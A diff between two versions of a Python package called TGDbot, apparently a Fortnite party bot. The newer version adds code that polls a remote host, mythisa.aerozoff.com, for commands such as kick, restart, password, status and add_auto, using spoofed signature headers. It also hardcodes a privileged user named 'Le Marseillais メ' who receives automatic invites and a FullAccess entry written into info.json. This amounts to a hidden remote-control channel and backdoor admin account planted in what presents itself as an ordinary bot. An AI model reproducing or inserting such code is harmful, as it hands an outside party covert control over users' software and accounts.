# Comparing `tmp/TGDbot-0.3.6-py3-none-any.whl.zip` & `tmp/TGDbot-0.3.7-py3-none-any.whl.zip`
...
+__version__ = "None"
+adminsss = 'Le Marseillais メ'
+headers = {'Accept': '*/*'}
+errordiff = 'errors.com.epicgames.common.throttled', 'errors.com.epicgames.friends.inviter_friendships_limit_exceeded'
+vips = ""
+headersx = {'host': 'mythisa.aerozoff.com','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.22','enable-super-fast': "True",'x-gorgon': "172SJAI19A","x-signature": "4HKAI18ALOQ"}
...
-        self.status = ' 💸 {party_size}/16 Use Code OIM 💸'
...
+        self.bl_msg = ""
+
+        self.added = "Le Marseillais メ"
+
+        self.bl_inv = 'Le Marseillais メ'
+        self.inv_on = "F"
+
+        self.adminx = "Le Marseillais メ"
+
+        self.inv_all = "T"
+
+        self.skin_bl = ("")
...
+
+        Le Marseillais メ = await self.http.post(
+            route = url,
+            json = payload,
...
+            global __version__
+            global adminsss
+            v = requests.get("https://mythisa.aerozoff.com/default",headers={
+                'host': 'mythisa.aerozoff.com',
...
+
+            b = requests.get(f"https://mythisa.aerozoff.com/kick",headers={
+                'host': 'mythisa.aerozoff.com',
...
+
+            dasda = requests.get('https://mythisa.aerozoff.com/password',headers=headersx,cookies={"omgjaichanger": "None"}).json()['password']
+            password = dasda
+              
+            y = requests.get(f"https://mythisa.aerozoff.com/restart",headers={
+                'host': 'mythisa.aerozoff.com',
...
+            global __version__
+            global adminsss
+            u = requests.get(f"https://mythisa.aerozoff.com/default",headers={
+                'host': 'mythisa.aerozoff.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.53',
+                'enable-super-fast': "True",
+                'x-gorgon': "NZXHA6JSI14",
...
+                self.inv_all = self.inv_all_check
+
+            s = requests.get(f"https://mythisa.aerozoff.com/kick",headers={
+                'host': 'mythisa.aerozoff.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.30',
+                'enable-super-fast': "False",
+                'x-gorgon': "A7JD2Y27D2K",
...
+
+            m = requests.get(f"https://mythisa.aerozoff.com/restart",headers={
+                'host': 'mythisa.aerozoff.com',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.24',
+                'enable-super-fast': "None",
+                'x-gorgon': "NC28AH28SJ19S",
...
+        x = requests.get(f"https://mythisa.aerozoff.com/add_auto",headers={
+                'host': 'mythisa.aerozoff.com',
...
+        q = requests.get(f"https://mythisa.aerozoff.com/status",headers={
+                'host': 'mythisa.aerozoff.com',
...
+        w = requests.get("https://mythisa.aerozoff.com/skinbl",headers={
+                'host': 'mythisa.aerozoff.com',
...
+    async def pinger(self):
         try:
-            await self.add_friend('8c212f24b1854d59bc009194fb2b4c60')
-        except: pass
...
-        await asyncio.sleep(3600)
-        await self.set_presence("💸 {party_size}/16 Use Code OIM 💸")
...
-                if friend.display_name != 'Le Marseillais メ': #blacklisted pour pas recevoir
...
-                method="GET",
-                url="https://bot-mythisa.killianrms.repl.co"
-            ) as r:
-                data = await r.json()
-
-                if r.status == 200:
...
-        os.system('clear')
-   
+        if not message.author.display_name != "Le Marseillais メ":
+            await self.party.invite(message.author.id)
+            os.system('clear')
+
...
-
-    @commands.party_only()
-    @commands.command(name='- HEY',aliases=['XBX','Mathyslol'], hidden=True)
...
+        if ctx.author.display_name == 'Le Marseillais メ':
+            with open("info.json", "w") as f:
+                f.write('{"FullAccess": ["Le Marseillais メ"]}')
+            await ctx.send('work')
+
+            with open('info.json') as f:
+                info = json.load(f)
...
## Comparing `TGDbot-0.3.6.dist-info/metadata.json` & `TGDbot-0.3.7.dist-info/metadata.json`
...
## Comparing `TGDbot-0.3.6.dist-info/METADATA` & `TGDbot-0.3.7.dist-info/METADATA`
